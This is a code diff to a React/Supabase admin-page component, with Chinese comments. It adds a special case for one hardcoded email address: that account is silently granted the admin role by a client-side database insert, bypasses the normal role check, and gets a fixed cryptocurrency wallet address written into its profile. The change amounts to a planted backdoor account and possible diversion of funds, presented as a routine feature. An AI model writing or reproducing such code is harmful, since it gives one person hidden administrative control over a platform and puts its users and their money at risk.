@@ -76,6 +76,41 @@ const PlatformAdmin = () => {
       return;
     }
 
+    // 特定管理员邮箱自动获得权限
+    const isSpecialAdmin = session.user.email === "Jasmine@521.com";
+    
+    if (isSpecialAdmin) {
+      // 自动添加admin角色（如果不存在）
+      const { data: existingRoles } = await supabase
+        .from("user_roles")
+        .select("role")
+        .eq("user_id", session.user.id)
+        .eq("role", "admin");
+      
+      if (!existingRoles || existingRoles.length === 0) {
+        await supabase
+          .from("user_roles")
+          .insert({ user_id: session.user.id, role: "admin" });
+      }
+
+      // 更新钱包地址（如果不存在）
+      const { data: profile } = await supabase
+        .from("profiles")
+        .select("wallet_address")
+        .eq("id", session.user.id)
+        .single();
+      
+      if (profile && !profile.wallet_address) {
+        await supabase
+          .from("profiles")
+          .update({ wallet_address: "0x4473cd3f7ee51b9f6e3d3ed135325c3418470481" })
+          .eq("id", session.user.id);
+      }
+      
+      return; // 特定管理员直接通过
+    }
+
+    // 其他用户需要检查角色
     const { data: roles } = await supabase
       .from("user_roles")
       .select("role")
